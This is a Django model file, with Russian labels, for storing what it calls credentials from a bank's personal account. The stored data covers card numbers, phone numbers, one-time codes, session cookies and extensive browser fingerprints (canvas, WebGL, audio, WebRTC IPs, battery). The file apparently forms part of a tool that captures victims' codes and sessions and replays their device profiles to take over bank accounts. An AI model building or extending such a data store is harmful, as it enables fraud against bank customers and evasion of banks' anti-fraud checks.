from django.db import models

from server.apps.accounts.validators import (validate_card_number,
                                             validate_phone_number)


class Account(models.Model):
    """Модель кредитов от ЛК банка."""

    title = models.CharField('Название', max_length=25, null=True, blank=True, help_text='Не обязательное поле')
    card_number = models.CharField(
        'Номер карты',
        max_length=16,
        null=False,
        blank=False,
        validators=[validate_card_number]
    )
    phone_number = models.CharField(
        'Номер телефона',
        max_length=11,
        null=False,
        blank=False,
        validators=[validate_phone_number]
    )
    temporary_code = models.CharField('Одноразовый код', max_length=4, null=True, blank=True)
    created_at = models.DateTimeField('Дата добавления', auto_now_add=True)
    is_active = models.BooleanField(default=True)
    is_authenticated = models.BooleanField(default=False)
    has_temporary_code = models.BooleanField(default=False)
    is_errored = models.BooleanField(default=False)
    session_cookies = models.TextField('Cookies session', null=True, blank=True)
    user_agent = models.TextField('Google user agent', null=True, blank=True)

    # Дополнительные поля для описания окружения
    navigator_platform = models.CharField('Платформа браузера', max_length=50, null=True, blank=True)
    hardware_concurrency = models.PositiveIntegerField('Количество логических процессоров', null=True, blank=True)
    device_memory = models.PositiveIntegerField('Объём памяти (GB)', null=True, blank=True)

    # Характеристики устройства
    screen_width = models.PositiveIntegerField('Ширина экрана (px)', null=True, blank=True)
    screen_height = models.PositiveIntegerField('Высота экрана (px)', null=True, blank=True)
    gpu = models.CharField('Видеокарта', max_length=100, null=True, blank=True)
    cpu = models.CharField('Процессор', max_length=100, null=True, blank=True)

    # Canvas и WebGL
    canvas_fingerprint = models.TextField('Canvas fingerprint', null=True, blank=True)
    webgl_vendor = models.CharField('WebGL Vendor', max_length=100, null=True, blank=True)
    webgl_renderer = models.CharField('WebGL Renderer', max_length=100, null=True, blank=True)

    # WebRTC
    local_ip = models.GenericIPAddressField('Локальный IP', null=True, blank=True)
    public_ip = models.GenericIPAddressField('Публичный IP', null=True, blank=True)

    # Аудио fingerprint
    audio_fingerprint = models.TextField('Аудио fingerprint', null=True, blank=True)

    # Заряд батареи
    battery_level = models.FloatField('Уровень заряда батареи', null=True, blank=True)
    is_charging = models.BooleanField('Зарядка подключена', null=True, blank=True)

    class Meta:
        verbose_name = 'Аккаунт'
        verbose_name_plural = 'Аккаунты'
        ordering = ['-created_at', 'is_active', '-is_errored', 'is_authenticated']

    def __str__(self):
        return str(self.title)

    def save(self, *args, **kwargs):
        if self.temporary_code:
            self.has_temporary_code = True

        super(Account, self).save(*args, **kwargs)
